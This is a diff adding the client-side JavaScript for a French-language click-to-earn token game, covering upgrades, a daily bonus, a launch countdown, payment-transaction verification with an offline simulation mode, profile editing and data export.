+            const tokensEarned = (gameState.click_power || 1) * 0.1;
+            gameState.current_coins = (gameState.current_coins || 0) + tokensEarned;
+            gameState.main_balance = (gameState.main_balance || 0) + tokensEarned;
+
+            updateDisplay();
+            saveGameData();
+
+            // Visual feedback
+            const clickBtn = document.getElementById('click-btn');
+            clickBtn.style.transform = 'scale(0.95)';
+            setTimeout(() => {
+                clickBtn.style.transform = 'scale(1)';
+            }, 100);
+        }
+
+        function showTab(tabName) {
+            // Hide all tabs
+            const tabs = document.querySelectorAll('.tab-content');
+            tabs.forEach(tab => tab.classList.remove('active'));
+            
+            // Remove active class from all triggers
+            const triggers = document.querySelectorAll('.tab-trigger');
+            triggers.forEach(trigger => trigger.classList.remove('active'));
+            
+            // Show selected tab
+            const targetTab = document.getElementById(`tab-${tabName}`);
+            if (targetTab) {
+                targetTab.classList.add('active');
+            }
+            
+            // Add active class to corresponding trigger
+            const correspondingTrigger = document.querySelector(`button[onclick="showTab('${tabName}')"]`);
+            if (correspondingTrigger) {
+                correspondingTrigger.classList.add('active');
+            }
+        }
+
+        function updateCountdown() {
+            const targetDate = new Date('2026-03-29T00:00:00Z').getTime();
+            const now = new Date().getTime();
+            const difference = targetDate - now;
+
+            if (difference > 0) {
+                const days = Math.floor(difference / (1000 * 60 * 60 * 24));
+                const hours = Math.floor((difference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((difference % (1000 * 60)) / 1000);
+
+                document.getElementById('days').textContent = String(days).padStart(3, '0');
+                document.getElementById('hours').textContent = String(hours).padStart(2, '0');
+                document.getElementById('minutes').textContent = String(minutes).padStart(2, '0');
+                document.getElementById('seconds').textContent = String(seconds).padStart(2, '0');
+            }
+        }
+
+        function showNotification(message, type = 'info') {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.className = `notification ${type} show`;
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+
+        function loadUpgrades() {
+            const upgradesShop = document.getElementById('upgrades-shop');
+            
+            const upgrades = [
+                { type: 'ENERGY_REGEN', name: 'Régénération Énergie', baseCost: 100, description: 'Augmente la régénération d\'énergie' },
+                { type: 'CLICK_POWER', name: 'Puissance de Clic', baseCost: 200, description: 'Augmente les tokens par clic' },
+                { type: 'AUTO_MINING', name: 'Auto Mining', baseCost: 500, description: 'Génère des tokens automatiquement' },
+                { type: 'MAX_ENERGY', name: 'Énergie Maximum', baseCost: 300, description: 'Augmente l\'énergie maximum' }
+            ];
+            
+            upgradesShop.innerHTML = upgrades.map(upgrade => {
+                const currentLevel = gameState.upgrades?.[upgrade.type] || 0;
+                const cost = Math.floor(upgrade.baseCost * Math.pow(1.5, currentLevel));
+                
+                return `
+                    <div class="cyber-card" style="margin-bottom: 15px;">
+                        <h4 style="color: var(--cyber-green); margin-bottom: 10px;">${upgrade.name}</h4>
+                        <p style="color: #ccc; font-size: 0.9rem; margin-bottom: 10px;">${upgrade.description}</p>
+                        <div style="display: flex; justify-content: space-between; align-items: center;">
+                            <span style="color: var(--cyber-yellow);">Niveau: ${currentLevel}</span>
+                            <button onclick="buyUpgrade('${upgrade.type}', ${cost})" class="cyber-button">
+                                ${cost} tokens
+                            </button>
+                        </div>
+                    </div>
+                `;
+            }).join('');
+        }
+
+        function buyUpgrade(type, cost) {
+            if (!gameState || gameState.current_coins < cost) {
+                showNotification('Solde insuffisant !', 'error');
+                return;
+            }
+            
+            gameState.current_coins -= cost;
+            gameState.main_balance -= cost;
+            
+            if (!gameState.upgrades) gameState.upgrades = {};
+            gameState.upgrades[type] = (gameState.upgrades[type] || 0) + 1;
+            
+            // Apply upgrade effects
+            switch(type) {
+                case 'ENERGY_REGEN':
+                    gameState.energy_regen_rate = 1.0 + (gameState.upgrades[type] * 0.5);
+                    break;
+                case 'CLICK_POWER':
+                    gameState.click_power = 1 + gameState.upgrades[type];
+                    break;
+                case 'AUTO_MINING':
+                    gameState.auto_mining_rate = gameState.upgrades[type] * 0.1;
+                    break;
+                case 'MAX_ENERGY':
+                    gameState.max_energy = 100 + (gameState.upgrades[type] * 25);
+                    break;
+            }
+            
+            updateDisplay();
+            loadUpgrades();
+            saveGameData();
+            
+            showNotification(`Amélioration ${type} achetée !`, 'success');
+        }
+
+        function claimDailyBonus() {
+            const now = new Date();
+            const lastClaim = gameState.last_daily_bonus ? new Date(gameState.last_daily_bonus) : null;
+            
+            if (lastClaim && now - lastClaim < 24 * 60 * 60 * 1000) {
+                showNotification('Bonus déjà réclamé aujourd\'hui !', 'error');
+                return;
+            }
+            
+            gameState.current_coins += 50;
+            gameState.main_balance += 50;
+            gameState.last_daily_bonus = now.toISOString();
+            
+            updateDisplay();
+            saveGameData();
+            
+            showNotification('Bonus quotidien de 50 tokens réclamé !', 'success');
+        }
+
+        async function verifyTransaction() {
+            const transactionId = document.getElementById('transaction-id-input').value.trim();
+            const paymentMethod = document.getElementById('payment-method-select').value;
+            
+            if (!transactionId) {
+                showNotification('Veuillez entrer un ID de transaction', 'error');
+                return;
+            }
+
+            try {
+                showNotification('Vérification en cours...', 'info');
+                
+                let result;
+                if (isOnlineMode && supabaseClient) {
+                    // Try real API verification
+                    const response = await fetch('/api/verify-transaction', {
+                        method: 'POST',
+                        headers: {
+                            'Authorization': `Bearer ${(await supabaseClient.auth.getSession()).data.session?.access_token}`,
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            transaction_id: transactionId,
+                            payment_method: paymentMethod
+                        })
+                    });
+
+                    if (response.ok) {
+                        result = await response.json();
+                    } else {
+                        throw new Error('API verification failed');
+                    }
+                } else {
+                    // Offline simulation
+                    result = simulateVerification(transactionId, paymentMethod);
+                }
+                
+                displayVerificationResult(result);
+                
+                if (result.verified) {
+                    const totalCredit = (result.amount || 0) + (result.bonus_amount || 0);
+                    gameState.current_coins += totalCredit;
+                    gameState.main_balance += result.amount || 0;
+                    gameState.bonus_balance += result.bonus_amount || 0;
+                    
+                    updateDisplay();
+                    saveGameData();
+                    
+                    showNotification(`Vérification réussie! +${totalCredit.toFixed(2)} crédité`, 'success');
+                }
+                
+            } catch (error) {
+                console.error('Verification error:', error);
+                showNotification('Erreur de vérification', 'error');
+            }
+        }
+
+        function simulateVerification(transactionId, paymentMethod) {
+            // Simple offline verification simulation
+            const amount = Math.random() * 50 + 10; // 10-60
+            const bonusAmount = amount * 0.17;
+            
+            return {
+                transaction_id: transactionId,
+                verified: Math.random() > 0.2, // 80% success rate
+                status: 'verified',
+                amount: amount,
+                bonus_amount: bonusAmount,
+                message: `Transaction simulée - ${amount.toFixed(2)} USD + ${bonusAmount.toFixed(2)} USD bonus (17%)`
+            };
+        }
+
+        function displayVerificationResult(result) {
+            const resultDiv = document.getElementById('verification-result');
+            const statusClass = result.verified ? 'success' : 'error';
+            const statusIcon = result.verified ? 'check-circle' : 'x-circle';
+            const statusColor = result.verified ? 'var(--cyber-green)' : '#ff4444';
+            
+            resultDiv.innerHTML = `
+                <div style="border: 2px solid ${statusColor}; border-radius: 8px; padding: 15px; background: rgba(${result.verified ? '0, 255, 136' : '255, 68, 68'}, 0.1);">
+                    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+                        <i data-lucide="${statusIcon}" style="color: ${statusColor}; margin-right: 8px;"></i>
+                        <span style="color: ${statusColor}; font-weight: bold;">
+                            ${result.verified ? 'Vérifiée ✓' : 'Échec ✗'}
+                        </span>
+                    </div>
+                    <p style="color: #ccc; margin-bottom: 8px;">${result.message}</p>
+                    <div style="font-size: 0.9rem; color: #aaa;">
+                        ID: ${result.transaction_id}
+                        ${result.amount ? `| Montant: ${result.amount.toFixed(2)} USD` : ''}
+                        ${result.bonus_amount ? `| Bonus: ${result.bonus_amount.toFixed(2)} USD` : ''}
+                    </div>
+                </div>
+            `;
+            
+            resultDiv.classList.remove('hidden');
+            lucide.createIcons();
+        }
+
+        function updateProfile() {
+            const username = document.getElementById('username-input').value;
+            const email = document.getElementById('email-input').value;
+            
+            if (currentUser) {
+                currentUser.username = username || currentUser.username;
+                currentUser.email = email || currentUser.email;
+                localStorage.setItem(USER_DATA_KEY, JSON.stringify(currentUser));
+                
+                document.getElementById('username-display').textContent = currentUser.username || currentUser.email;
+                showNotification('Profil mis à jour !', 'success');
+            }
+        }
+
+        function exportData() {
+            const exportData = {
+                user: currentUser,
+                gameState: gameState,
+                exportDate: new Date().toISOString(),
+                mode: isOnlineMode ? 'online' : 'offline'
+            };
+            
+            const dataStr = JSON.stringify(exportData, null, 2);
+            const dataBlob = new Blob([dataStr], {type: 'application/json'});
+            
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(dataBlob);
+            link.download = `mainet_data_${Date.now()}.json`;
+            link.click();
+            
+            showNotification('Données exportées !', 'success');
+        }
+
+        function logout() {
+            if (confirm('Êtes-vous sûr de vouloir vous déconnecter ?')) {
+                localStorage.removeItem(USER_DATA_KEY);
+                localStorage.removeItem(GAME_DATA_KEY);
+                location.reload();
+            }
+        }
+    </script>
+</body>
+</html>
